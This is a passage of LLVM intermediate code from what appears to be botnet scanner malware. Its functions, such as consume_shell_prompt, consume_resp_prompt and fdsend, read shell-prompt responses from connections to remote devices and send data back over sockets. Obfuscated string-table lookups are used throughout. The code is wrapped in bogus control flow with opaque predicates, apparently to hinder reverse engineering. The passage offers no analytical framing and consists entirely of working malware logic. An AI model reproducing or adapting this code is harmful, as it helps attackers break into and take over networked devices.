  br label %236

; <label>:236:                                    ; preds = %234, %225
  br label %237

; <label>:237:                                    ; preds = %236, %originalBBpart237
  br label %238

; <label>:238:                                    ; preds = %237, %135
  %239 = load i32, i32* %8, align 4
  %240 = icmp eq i32 %239, -1
  br i1 %240, label %241, label %242

; <label>:241:                                    ; preds = %238
  store i32 0, i32* %3, align 4
  br label %244

; <label>:242:                                    ; preds = %238
  %243 = load i32, i32* %8, align 4
  store i32 %243, i32* %3, align 4
  br label %244

; <label>:244:                                    ; preds = %242, %241
  %245 = load i32, i32* @x.23
  %246 = load i32, i32* @y.24
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %244
  %253 = load i32, i32* %3, align 4
  %254 = load i32, i32* @x.23
  %255 = load i32, i32* @y.24
  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  ret i32 %253

originalBBalteredBB:                              ; preds = %originalBB, %16
  %262 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %263 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %262, i32 0, i32 7
  %264 = load i32, i32* %6, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds [8192 x i8], [8192 x i8]* %263, i64 0, i64 %265
  %267 = load i8, i8* %266, align 1
  %268 = sext i8 %267 to i32
  %269 = icmp eq i32 %268, 58
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %68
  %270 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %271 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %270, i32 0, i32 7
  %272 = load i32, i32* %6, align 4
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds [8192 x i8], [8192 x i8]* %271, i64 0, i64 %273
  %275 = load i8, i8* %274, align 1
  %276 = sext i8 %275 to i32
  %277 = icmp eq i32 %276, 37
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %96
  %278 = load i32, i32* %6, align 4
  %_ = sub i32 0, %278
  %gen = add i32 %_, 1
  %_7 = sub i32 0, %278
  %gen8 = add i32 %_7, 1
  %279 = add nsw i32 %278, 1
  store i32 %279, i32* %8, align 4
  br label %originalBB6

originalBB12alteredBB:                            ; preds = %originalBB12, %116
  %280 = load i32, i32* %6, align 4
  %_13 = sub i32 0, %280
  %gen14 = add i32 %_13, -1
  %_15 = shl i32 %280, -1
  %_16 = sub i32 %280, -1
  %gen17 = mul i32 %_16, -1
  %_18 = sub i32 %280, -1
  %gen19 = mul i32 %_18, -1
  %_20 = sub i32 %280, -1
  %gen21 = mul i32 %_20, -1
  %_22 = sub i32 %280, -1
  %gen23 = mul i32 %_22, -1
  %281 = add nsw i32 %280, -1
  store i32 %281, i32* %6, align 4
  br label %originalBB12

originalBB27alteredBB:                            ; preds = %originalBB27, %141
  %282 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %283 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %282, i32 0, i32 7
  %284 = getelementptr inbounds [8192 x i8], [8192 x i8]* %283, i32 0, i32 0
  %285 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %286 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %285, i32 0, i32 4
  %287 = load i32, i32* %286, align 8
  %288 = call i32 @util_memsearch(i8* %284, i32 %287, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.144, i32 0, i32 0), i32 4)
  store i32 %288, i32* %7, align 4
  %289 = icmp ne i32 %288, -1
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %190
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %208
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %244
  %290 = load i32, i32* %3, align 4
  br label %originalBB39
}

; Function Attrs: noinline nounwind uwtable
define i32 @fdsend(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca [5026 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca [1 x %struct.__va_list_tag], align 16
  store i32 %0, i32* %4, align 4
  store i8* %1, i8** %5, align 8
  store i32 0, i32* %7, align 4
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %8, i32 0, i32 0
  %10 = bitcast %struct.__va_list_tag* %9 to i8*
  call void @llvm.va_start(i8* %10)
  %11 = getelementptr inbounds [5026 x i8], [5026 x i8]* %6, i32 0, i32 0
  %12 = load i8*, i8** %5, align 8
  %13 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %8, i32 0, i32 0
  %14 = call i32 @vsprintf(i8* %11, i8* %12, %struct.__va_list_tag* %13) #7
  store i32 %14, i32* %7, align 4
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %8, i32 0, i32 0
  %16 = bitcast %struct.__va_list_tag* %15 to i8*
  call void @llvm.va_end(i8* %16)
  %17 = load i32, i32* %4, align 4
  %18 = getelementptr inbounds [5026 x i8], [5026 x i8]* %6, i32 0, i32 0
  %19 = load i32, i32* %7, align 4
  %20 = sext i32 %19 to i64
  %21 = call i64 @send(i32 %17, i8* %18, i64 %20, i32 16384)
  %22 = load i32, i32* %7, align 4
  %23 = sext i32 %22 to i64
  %24 = icmp ne i64 %21, %23
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %29

; <label>:26:                                     ; preds = %2
  %27 = load i32, i32* %4, align 4
  %28 = call i64 @send(i32 %27, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  store i32 1, i32* %3, align 4
  br label %29

; <label>:29:                                     ; preds = %26, %25
  %30 = load i32, i32* @x.25
  %31 = load i32, i32* @y.26
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %29
  %38 = load i32, i32* %3, align 4
  %39 = load i32, i32* @x.25
  %40 = load i32, i32* @y.26
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %38

originalBBalteredBB:                              ; preds = %originalBB, %29
  %47 = load i32, i32* %3, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_shell_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %5, align 4
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 7
  %8 = getelementptr inbounds [8192 x i8], [8192 x i8]* %7, i32 0, i32 0
  %9 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %10 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %9, i32 0, i32 4
  %11 = load i32, i32* %10, align 8
  %12 = call i32 @util_memsearch(i8* %8, i32 %11, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.139, i32 0, i32 0), i32 8)
  %13 = icmp ne i32 %12, -1
  br i1 %13, label %14, label %31

; <label>:14:                                     ; preds = %1
  %15 = load i32, i32* @x.27
  %16 = load i32, i32* @y.28
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  store i32 -1, i32* %2, align 4
  %23 = load i32, i32* @x.27
  %24 = load i32, i32* @y.28
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %307

; <label>:31:                                     ; preds = %1
  %32 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %33 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %32, i32 0, i32 7
  %34 = getelementptr inbounds [8192 x i8], [8192 x i8]* %33, i32 0, i32 0
  %35 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %36 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %35, i32 0, i32 4
  %37 = load i32, i32* %36, align 8
  %38 = call i32 @util_memsearch(i8* %34, i32 %37, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.140, i32 0, i32 0), i32 6)
  %39 = icmp ne i32 %38, -1
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %31
  store i32 -1, i32* %2, align 4
  br label %307

; <label>:41:                                     ; preds = %31
  %42 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %43 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %42, i32 0, i32 7
  %44 = getelementptr inbounds [8192 x i8], [8192 x i8]* %43, i32 0, i32 0
  %45 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %46 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %45, i32 0, i32 4
  %47 = load i32, i32* %46, align 8
  %48 = call i32 @util_memsearch(i8* %44, i32 %47, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.141, i32 0, i32 0), i32 9)
  %49 = icmp ne i32 %48, -1
  br i1 %49, label %50, label %67

; <label>:50:                                     ; preds = %41
  %51 = load i32, i32* @x.27
  %52 = load i32, i32* @y.28
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %50
  store i32 -1, i32* %2, align 4
  %59 = load i32, i32* @x.27
  %60 = load i32, i32* @y.28
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %307

; <label>:67:                                     ; preds = %41
  %68 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %69 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %68, i32 0, i32 7
  %70 = getelementptr inbounds [8192 x i8], [8192 x i8]* %69, i32 0, i32 0
  %71 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i32 0, i32 4
  %73 = load i32, i32* %72, align 8
  %74 = call i32 @util_memsearch(i8* %70, i32 %73, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.142, i32 0, i32 0), i32 14)
  %75 = icmp ne i32 %74, -1
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %67
  store i32 -1, i32* %2, align 4
  br label %307

; <label>:77:                                     ; preds = %67
  %78 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %79 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %78, i32 0, i32 7
  %80 = getelementptr inbounds [8192 x i8], [8192 x i8]* %79, i32 0, i32 0
  %81 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %82 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %81, i32 0, i32 4
  %83 = load i32, i32* %82, align 8
  %84 = call i32 @util_memsearch(i8* %80, i32 %83, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.143, i32 0, i32 0), i32 5)
  %85 = icmp ne i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %77
  store i32 -1, i32* %2, align 4
  br label %307

; <label>:87:                                     ; preds = %77
  %88 = load i32, i32* @x.27
  %89 = load i32, i32* @y.28
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %87
  %96 = load i32, i32* @x.27
  %97 = load i32, i32* @y.28
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %104

; <label>:104:                                    ; preds = %originalBBpart28
  br label %105

; <label>:105:                                    ; preds = %104
  br label %106

; <label>:106:                                    ; preds = %105
  %107 = load i32, i32* @x.27
  %108 = load i32, i32* @y.28
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %106
  %115 = load i32, i32* @x.27
  %116 = load i32, i32* @y.28
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %123

; <label>:123:                                    ; preds = %originalBBpart212
  %124 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %125 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %124, i32 0, i32 4
  %126 = load i32, i32* %125, align 8
  %127 = sub nsw i32 %126, 1
  store i32 %127, i32* %4, align 4
  br label %128

; <label>:128:                                    ; preds = %246, %123
  %129 = load i32, i32* %4, align 4
  %130 = icmp sgt i32 %129, 0
  br i1 %130, label %131, label %249

; <label>:131:                                    ; preds = %128
  %132 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %133 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %132, i32 0, i32 7
  %134 = load i32, i32* %4, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds [8192 x i8], [8192 x i8]* %133, i64 0, i64 %135
  %137 = load i8, i8* %136, align 1
  %138 = sext i8 %137 to i32
  %139 = icmp eq i32 %138, 58
  br i1 %139, label %210, label %140

; <label>:140:                                    ; preds = %131
  %141 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %142 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %141, i32 0, i32 7
  %143 = load i32, i32* %4, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds [8192 x i8], [8192 x i8]* %142, i64 0, i64 %144
  %146 = load i8, i8* %145, align 1
  %147 = sext i8 %146 to i32
  %148 = icmp eq i32 %147, 62
  br i1 %148, label %210, label %149

; <label>:149:                                    ; preds = %140
  %150 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %151 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %150, i32 0, i32 7
  %152 = load i32, i32* %4, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds [8192 x i8], [8192 x i8]* %151, i64 0, i64 %153
  %155 = load i8, i8* %154, align 1
  %156 = sext i8 %155 to i32
  %157 = icmp eq i32 %156, 36
  br i1 %157, label %210, label %158

; <label>:158:                                    ; preds = %149
  %159 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %160 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %159, i32 0, i32 7
  %161 = load i32, i32* %4, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds [8192 x i8], [8192 x i8]* %160, i64 0, i64 %162
  %164 = load i8, i8* %163, align 1
  %165 = sext i8 %164 to i32
  %166 = icmp eq i32 %165, 35
  br i1 %166, label %210, label %167

; <label>:167:                                    ; preds = %158
  %168 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %169 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %168, i32 0, i32 7
  %170 = load i32, i32* %4, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds [8192 x i8], [8192 x i8]* %169, i64 0, i64 %171
  %173 = load i8, i8* %172, align 1
  %174 = sext i8 %173 to i32
  %175 = icmp eq i32 %174, 37
  br i1 %175, label %210, label %176

; <label>:176:                                    ; preds = %167
  %177 = load i32, i32* @x.27
  %178 = load i32, i32* @y.28
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %176
  %185 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %186 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %185, i32 0, i32 7
  %187 = load i32, i32* %4, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds [8192 x i8], [8192 x i8]* %186, i64 0, i64 %188
  %190 = load i8, i8* %189, align 1
  %191 = sext i8 %190 to i32
  %192 = icmp eq i32 %191, 93
  %193 = load i32, i32* @x.27
  %194 = load i32, i32* @y.28
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %192, label %210, label %201

; <label>:201:                                    ; preds = %originalBBpart216
  %202 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %203 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %202, i32 0, i32 7
  %204 = load i32, i32* %4, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds [8192 x i8], [8192 x i8]* %203, i64 0, i64 %205
  %207 = load i8, i8* %206, align 1
  %208 = sext i8 %207 to i32
  %209 = icmp eq i32 %208, 126
  br i1 %209, label %210, label %229

; <label>:210:                                    ; preds = %201, %originalBBpart216, %167, %158, %149, %140, %131
  %211 = load i32, i32* @x.27
  %212 = load i32, i32* @y.28
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %210
  %219 = load i32, i32* %4, align 4
  %220 = add nsw i32 %219, 1
  store i32 %220, i32* %5, align 4
  %221 = load i32, i32* @x.27
  %222 = load i32, i32* @y.28
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %249

; <label>:229:                                    ; preds = %201
  %230 = load i32, i32* @x.27
  %231 = load i32, i32* @y.28
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %229
  %238 = load i32, i32* @x.27
  %239 = load i32, i32* @y.28
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %246

; <label>:246:                                    ; preds = %originalBBpart224
  %247 = load i32, i32* %4, align 4
  %248 = add nsw i32 %247, -1
  store i32 %248, i32* %4, align 4
  br label %128

; <label>:249:                                    ; preds = %originalBBpart220, %128
  %250 = load i32, i32* %5, align 4
  %251 = icmp eq i32 %250, 0
  br i1 %251, label %252, label %269

; <label>:252:                                    ; preds = %249
  %253 = load i32, i32* @x.27
  %254 = load i32, i32* @y.28
  %255 = sub i32 %253, 1
  %256 = mul i32 %253, %255
  %257 = urem i32 %256, 2
  %258 = icmp eq i32 %257, 0
  %259 = icmp slt i32 %254, 10
  %260 = or i1 %258, %259
  br i1 %260, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %252
  store i32 1, i32* %5, align 4
  %261 = load i32, i32* @x.27
  %262 = load i32, i32* @y.28
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %269

; <label>:269:                                    ; preds = %originalBBpart228, %249
  %270 = load i32, i32* @x.27
  %271 = load i32, i32* @y.28
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %269
  %278 = load i32, i32* %5, align 4
  %279 = icmp eq i32 %278, -1
  %280 = load i32, i32* @x.27
  %281 = load i32, i32* @y.28
  %282 = sub i32 %280, 1
  %283 = mul i32 %280, %282
  %284 = urem i32 %283, 2
  %285 = icmp eq i32 %284, 0
  %286 = icmp slt i32 %281, 10
  %287 = or i1 %285, %286
  br i1 %287, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %279, label %288, label %305

; <label>:288:                                    ; preds = %originalBBpart232
  %289 = load i32, i32* @x.27
  %290 = load i32, i32* @y.28
  %291 = sub i32 %289, 1
  %292 = mul i32 %289, %291
  %293 = urem i32 %292, 2
  %294 = icmp eq i32 %293, 0
  %295 = icmp slt i32 %290, 10
  %296 = or i1 %294, %295
  br i1 %296, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %288
  store i32 0, i32* %2, align 4
  %297 = load i32, i32* @x.27
  %298 = load i32, i32* @y.28
  %299 = sub i32 %297, 1
  %300 = mul i32 %297, %299
  %301 = urem i32 %300, 2
  %302 = icmp eq i32 %301, 0
  %303 = icmp slt i32 %298, 10
  %304 = or i1 %302, %303
  br i1 %304, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %307

; <label>:305:                                    ; preds = %originalBBpart232
  %306 = load i32, i32* %5, align 4
  store i32 %306, i32* %2, align 4
  br label %307

; <label>:307:                                    ; preds = %305, %originalBBpart236, %86, %76, %originalBBpart24, %40, %originalBBpart2
  %308 = load i32, i32* @x.27
  %309 = load i32, i32* @y.28
  %310 = sub i32 %308, 1
  %311 = mul i32 %308, %310
  %312 = urem i32 %311, 2
  %313 = icmp eq i32 %312, 0
  %314 = icmp slt i32 %309, 10
  %315 = or i1 %313, %314
  br i1 %315, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %307
  %316 = load i32, i32* %2, align 4
  %317 = load i32, i32* @x.27
  %318 = load i32, i32* @y.28
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  ret i32 %316

originalBBalteredBB:                              ; preds = %originalBB, %14
  store i32 -1, i32* %2, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %50
  store i32 -1, i32* %2, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %87
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %106
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %176
  %325 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %326 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %325, i32 0, i32 7
  %327 = load i32, i32* %4, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds [8192 x i8], [8192 x i8]* %326, i64 0, i64 %328
  %330 = load i8, i8* %329, align 1
  %331 = sext i8 %330 to i32
  %332 = icmp eq i32 %331, 93
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %210
  %333 = load i32, i32* %4, align 4
  %_ = shl i32 %333, 1
  %334 = add nsw i32 %333, 1
  store i32 %334, i32* %5, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %229
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %252
  store i32 1, i32* %5, align 4
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %269
  %335 = load i32, i32* %5, align 4
  %336 = icmp eq i32 %335, -1
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %288
  store i32 0, i32* %2, align 4
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %307
  %337 = load i32, i32* %2, align 4
  br label %originalBB38
}

declare void @table_unlock_val(i8 zeroext) #2

declare i8* @table_retrieve_val(i32, i32*) #2

declare void @table_lock_val(i8 zeroext) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_resp_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 12)
  %7 = call i8* @table_retrieve_val(i32 12, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 4
  %13 = load i32, i32* %12, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub nsw i32 %15, 1
  %17 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %16)
  store i32 %17, i32* %5, align 4
  %18 = load i32, i32* %5, align 4
  %19 = icmp eq i32 %18, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %1
  call void @table_lock_val(i8 zeroext 12)
  store i32 0, i32* %2, align 4
  br label %39

; <label>:21:                                     ; preds = %1
  %22 = load i32, i32* @x.29
  %23 = load i32, i32* @y.30
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  call void @table_lock_val(i8 zeroext 12)
  %30 = load i32, i32* %5, align 4
  store i32 %30, i32* %2, align 4
  %31 = load i32, i32* @x.29
  %32 = load i32, i32* @y.30
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %39

; <label>:39:                                     ; preds = %originalBBpart2, %20
  %40 = load i32, i32* %2, align 4
  ret i32 %40

originalBBalteredBB:                              ; preds = %originalBB, %21
  call void @table_lock_val(i8 zeroext 12)
  %41 = load i32, i32* %5, align 4
  store i32 %41, i32* %2, align 4
  br label %originalBB
}

